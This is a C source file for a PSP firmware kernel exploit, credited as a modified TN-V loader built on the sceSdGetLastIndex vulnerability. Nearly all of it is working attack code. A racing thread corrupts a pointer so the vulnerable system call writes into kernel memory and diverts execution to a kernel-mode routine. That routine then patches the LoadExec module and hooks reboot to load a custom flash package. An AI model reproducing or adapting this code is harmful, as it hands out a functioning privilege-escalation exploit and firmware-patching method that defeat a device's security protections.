/*
 * Modified TN-V by 173210
 * Based on the reverse of TN-V by GUIDOBOT
 * It uses sceSdGetLastIndex Exploit by qwikrazor87.
 * Copyright (C) Total-Noob All rights reserved.
 */

#include "../common/lib.h"
#include "../common/structures.h"
#include "reboot.h"

static void (* const _sceKernelIcacheInvalidateAll)() = (void *)0x88000E98;
static char * (* const _sceUnk)() = (void *)0x880098A4;
char * (* const sprintf)(char * destination, const char * mask, ...) = (void *)0x8800E1D4;
unsigned (* const _sceUnknown2)(unsigned, int, void *, int) = (void *)0x8800F804;

static void (* _sceCtrlReadBufferPositive)(SceCtrlData *, int);
static SceModule2 * (* _sceKernelFindModuleByName)(const char *);

static int (* _sceIoWrite)(SceUID, void *, unsigned);
static int (* _sceIoClose)(SceUID);
static SceUID (* _sceIoOpen)(const char *, int, int);

static int (* _sceReboot)(void *, void *, int, int);
static int (* _LoadExec2B04)(int);
static int (* _sceIoGetstat)(const char *, SceIoStat *);
static int (* _sceIoRead)(SceUID, void *, unsigned);

static kernel_file * const kFiles = (kernel_file *)0x8B000000;
static int * const exploitPointer = (int *)0xA800F71C;
static int exploited;

static const int mode_recovery = 4;
struct
{
	char unknown_string[14];
	char exploit_path[66];
	int fw_version;
	int gzip_dec_result;
	char unknown_big[408];
	char unknown_not_used[68];
	int load_mode;
	char unknown_not_used2[28];
} globals;

static void fillDisp(int color)
{
	int *p;

	for(p = (int *)0x44000000; (int)p < 0x44088000; p++)
		*p = color;
};

static int kResolve()
{
	unsigned *kp;

	for(kp = (unsigned *)0x88000000; (unsigned)kp < 0x883FFFA8; kp++) {
		if (kp[0] == 0x27BDFFE0
			&& kp[1] == 0xAFB40010
			&& kp[2] == 0xAFB3000C
			&& kp[3] == 0xAFB20008
			&& kp[4] == 0x00009021
			&& kp[5] == 0x02409821
			&& kp[21] == 0x0263202A)
		{
			_sceKernelFindModuleByName = (void *)kp;

			//searches IO file functions
			_sceIoOpen = (void *)FindFunction("sceIOFileManager", "IoFileMgrForKernel", 0x109F50BC);
			_sceIoRead = (void *)FindFunction("sceIOFileManager", "IoFileMgrForKernel", 0x6A638D83);
			_sceIoWrite = (void *)FindFunction("sceIOFileManager", "IoFileMgrForKernel", 0x42EC03AC);
			_sceIoClose = (void *)FindFunction("sceIOFileManager", "IoFileMgrForKernel", 0x810C4BC3);
			_sceIoGetstat = (void *)FindFunction("sceIOFileManager", "IoFileMgrForKernel", 0xACE946E8);

			//finds readbuffer function
			_sceCtrlReadBufferPositive = (void *)FindFunction("sceController_Service", "sceCtrl", 0x1F803938);
			return 0;
		};
	};

	return -1;
}

static int loadCfg(t_config *data)
{
	SceUID fd;
	int ret;

	fd = _sceIoOpen("ms0:/flash/config.tn", PSP_O_RDONLY, 0);
	if (fd < 0)
		return fd;

	ret = _sceIoRead(fd, data, sizeof(t_config));
	if (ret != sizeof(t_config)) {
		memset(data, 0, sizeof(t_config));
		ret = -1;
	};

	_sceIoClose(fd);

	return ret;
};

static int getFw()
{
	kernel_file *p;
	SceUID fd;
	char buf[64];

	for (p = kFiles; p->buffer; p++)
		switch(p->size) {
			case 48000: return 0x160;
			case 48128: return 0x165;
			case 48384: return 0x169;
			case 48448: return 0x180;
			case 48704: return 0x200;
			case 48832: return 0x205;
			case 48960: return 0x210;
			case 49280: return 0x260;
			case 49664: return 0x261;
			case 51200: return 0x300;
			case 52288: return 0x301;
			case 46784: return 0x310;
			case 46912: return 0x315;
			default:
				sprintf(buf, "%s/SIZE.TXT", globals.exploit_path);
				fd = _sceIoOpen(buf, PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
				if (fd < 0)
					return fd;
				sprintf(buf, "size: 0x%08X\n", p->size);
				_sceIoWrite(fd, buf, sizeof("size: 0x00000000\n"));
				_sceIoClose(fd);
				fillDisp(0x00FF0000);
				__asm__("break");
		};

	return -1;
};

static int loadPkt()
{
	kernel_file * const kNew = (kernel_file *)0x8BA00000;
	kernel_file *kp;
	packet_entry entry;
	SceUID fd;
	void *p;
	char *strp;
	char file[64];
	size_t kSize = 0;
	unsigned kCnt = 0;
	unsigned pktCnt;
	int ret;

	sprintf(file, "%s/FLASH0.TN", globals.exploit_path);
	fd = _sceIoOpen(file, PSP_O_RDONLY, 0);
	if(fd < 0)
		return fd;

	ret = _sceIoRead(fd, &pktCnt, sizeof(unsigned));
	if (ret != sizeof(unsigned)) {
		_sceIoClose(fd);
		return ret;
	}

	for (kp = kFiles; kp->buffer; kp++) {
		kCnt++;
		kSize += sizeof(kernel_file);
	};

	memcpy(kNew + pktCnt, kFiles, kSize);
	(kNew + kCnt + pktCnt)->buffer = 0;

	kp = kNew;
	strp = (char *)0x8BE00000;
	p = kNew + kCnt + pktCnt + 1;
	while((ret = _sceIoRead(fd, &entry, sizeof(entry))) == sizeof(entry)) {
		if(entry.magic != 0x4B504E54) //TNPK magic
			continue;

		p = (char *)(((unsigned)p + 63) & 0xFFFFFFC0);

		kp->name = strp;
		kp->buffer = p;
		kp->size = entry.data_size;

		_sceIoRead(fd, strp, entry.name_size);
		_sceIoRead(fd, p, entry.data_size);

		kp++;
		strp += entry.name_size;
		p += entry.data_size;
	};

	_sceIoClose(fd);
	return 0;
};

static int hookLoadExec2B04(int unk)
{
	globals.fw_version = getFw();
	loadPkt();
	return _LoadExec2B04(unk);
};

static int hookReboot(void * r_param, void * e_param, int api, int unk)
{
	globals.gzip_dec_result = _sceUnknown2(0x88FC0000, 16384, reboot_data, 0);

	memcpy(globals.unknown_big, (void *)(globals.fw_version < 0x210 ? 0xABDFF000 : 0xA83FF000), sizeof(globals.unknown_big));
	memcpy((void *)0x88FB0000, &globals, sizeof(globals));

	return _sceReboot(r_param, e_param, api, unk);
};

static int patchLoadExec(SceModule2 *mod)
{
	int *p;

	if (mod == NULL)
		return -1;

	_sceReboot = (void *)mod->text_addr;

	p = (int *)(mod->text_addr | 0x20000000);

	*(short *)((void *)p + 0x16A6) = 0x1000;
	*(short *)((void *)p + 0x241E) = 0x1000;
	*(short *)((void *)p + 0x2622) = 0x1000;

	while ((unsigned)p < (mod->text_addr | 0x20000000) + mod->text_size) {
		switch (p[0]) {
			case 0x24070200: //@0x00002964 in 3.18
				memset(p, 0, 0x20);
				break;

			case 0x17C001D3://@0x00002B9C in 3.18
				p[0] = 0; // bnez $fp, loc_000032EC

				p[98] = 0x24050002; //ori $a1, $v1, 0x2
				p[99] = 0x12E500B7; //bnez $s7, loc_00003008
				p[100] = 0xAC570018; //sw $a1, 24($v0)

				p[153] = MAKE_CALL(hookReboot); //jal sub_00000000
				p[172] = 0x000000FC; //lui $at, 0x8860

				p[511] = 0x24050200; //li $s0, 512
				p[512] = 0x12650003; //beq $s3, $s0, loc_000033AC
				p[513] = 0x241E0210; //li $s5, 528
				p[514] = 0x567EFFDE; //bne $s3, $s5, loc_00003320
				p[516] = MAKE_STH(p + 2); //lui $v0, 0x0
				p[517] = 0x24170001; //lw $v0, 9952($v0)

				p[707] = 0x03E00008; //jr $ra (sceKernelGetUserLevel import)
				p[708] = 0x24020004; //nop

				break;
			
			case 0x02202021:
				if (p[1] == 0x00401821) { //@0x000029C0 in 3.18
					*(int *)_LoadExec2B04 = MAKE_STH2(p - 1); //jal sub_00002B04
					p[-1] = MAKE_CALL(hookLoadExec2B04);
				}
				break;

			default:
				break;
		};

		p++;
	}

	return 0;
}

static void kmain()
{
	int (* _sceKernelLoadExecVSHMs2)(char *, struct SceKernelLoadExecVSHParam *);
	int (* _sceKernelExitVSHVSH)(int);
	t_config cfg;
	struct SceKernelLoadExecVSHParam param;
	SceCtrlData pad_data;
	SceIoStat stat;
	SceModule2 *mod;
	char vshmain_args[1024];

	__asm("lui $k1, 0x0");

	exploited = 1;

	fillDisp(0x00FF0000);

	kResolve();

	mod = _sceKernelFindModuleByName("sceLoadExec");

	*exploitPointer = 0;

	patchLoadExec(mod);

	_sceKernelIcacheInvalidateAll();

	sprintf(globals.unknown_string, _sceUnk() + 68);

	_sceCtrlReadBufferPositive(&pad_data, 1);

	if(pad_data.Buttons & PSP_CTRL_RTRIGGER || _sceIoGetstat("ms0:/flash", &stat) < 0)
		globals.load_mode = mode_recovery;

	if(globals.load_mode != mode_recovery)
	{
		loadCfg(&cfg);

		if(cfg.load_eboot && _sceIoGetstat("ms0:/PSP/GAME/BOOT/FBOOT.PBP", &stat) >= 0) {
			memset(vshmain_args, 0, sizeof(vshmain_args));
			vshmain_args[0x01] = 0x04;
			vshmain_args[0x04] = 0x20;
			vshmain_args[0x40] = 0x01;

			memset(&param, 0, sizeof(param));
			param.size = sizeof(param);
			param.args = 29;
			param.argp = "ms0:/PSP/GAME/BOOT/FBOOT.PBP"; 
			param.key = "game";
			param.vshmain_args_size = sizeof(vshmain_args);
			param.vshmain_args = vshmain_args;

			_sceKernelLoadExecVSHMs2 = (void *)(mod->text_addr + 0x1DAC);
			_sceKernelLoadExecVSHMs2("ms0:/PSP/GAME/BOOT/FBOOT.PBP", &param);
			return;
		};
	};

	_sceKernelExitVSHVSH = (void *)(mod->text_addr + 0x1674);
	_sceKernelExitVSHVSH(0);
	return;
};

static int storeThread(SceSize arglen __attribute__((unused)), void *argp)
{
	int (* _sceKernelDelayThread)(SceUInt);
	unsigned *packet = *(unsigned **)argp;

	_sceKernelDelayThread = FindImport((void *)0x08400000, "ThreadManForUser", 0xCEADEB47);

	while (!exploited) {
		packet[9] = (unsigned)exploitPointer - 18 - (unsigned)packet;
		_sceKernelDelayThread(0);
	}

	return 0;
}

static void do_exploit()
{
	unsigned packet[256] = { [9] = (unsigned)packet };
	SceUtilitySavedataParam params = {
		.base = {
			.size = sizeof(SceUtilitySavedataParam),
			.graphicsThread = 8,
			.accessThread = 8,
			.fontThread = 8,
			.soundThread = 8
		},
		.mode = PSP_UTILITY_SAVEDATA_AUTOLOAD
	};

	SceUID (* _sceKernelCreateThread)(const char *, SceKernelThreadEntry, int, int, SceUInt, SceKernelThreadOptParam *);
	int (* _sceKernelStartThread)(SceUID, SceSize, void *);
	int (* _sceKernelVolatileMemUnlock)(int);
	int (* _sceKernelLibcTime)(int, int);
	int (* _sceSdGetLastIndex)(void *, void *, void *);
	int (* _sceUtilitySavedataInitStart)(SceUtilitySavedataParam *);
	int (* _sceUtilitySavedataGetStatus)();

	_sceKernelVolatileMemUnlock = FindImport((void *)0x08800000, "sceSuspendForUser", 0xA569E425);
	_sceUtilitySavedataInitStart = FindImport((void *)0x08800000, "sceUtility", 0x50C4CD57);

	if (_sceKernelVolatileMemUnlock != NULL)
		_sceKernelVolatileMemUnlock(0);
	_sceUtilitySavedataInitStart(&params);

	_sceKernelLibcTime = FindImport((void *)0x08800000, "UtilsForUser", 0x27CC57F0); 
	_sceUtilitySavedataGetStatus = FindImport((void *)0x08800000, "sceUtility", 0x8874DBE0);

	while (_sceUtilitySavedataGetStatus() < 2);

	_sceKernelCreateThread = FindImport((void *)0x08400000, "ThreadManForUser", 0x446D8DE6);
	_sceKernelStartThread = FindImport((void *)0x08400000, "ThreadManForUser", 0xF475845D);
	_sceSdGetLastIndex = FindImport((void *)0x08400000, "sceChnnlsv", 0xC4C494F8);

	exploited = 0;
	_sceKernelStartThread(_sceKernelCreateThread("StoreThread", storeThread, 8, 512, THREAD_ATTR_USER, NULL), sizeof(packet[9]), packet + 9);

	while (1) {
		packet[9] = 16;
		_sceSdGetLastIndex(packet, packet + 64, packet + 128);
		_sceKernelLibcTime(0x08800000, (int)kmain | 0x80000000);
	}
};

void _start() __attribute__((section(".text.start")));
void _start(const char *path)
{
	void (* _sceDisplaySetFrameBuf)(void *, int, int, int);
	int i;

	_sceDisplaySetFrameBuf = FindImport((void *)0x08800000, "sceDisplay", 0x289D82FE);
	if (_sceDisplaySetFrameBuf)
		_sceDisplaySetFrameBuf((void *)0x44000000, 512, 3, 1);
	
	fillDisp(0x00FFFFFF);

	memset(&globals, 0, sizeof(globals));

	for (i = 0; path[i + sizeof("TN.BIN")]; i++)
		globals.exploit_path[i] = path[i];

	do_exploit();
};
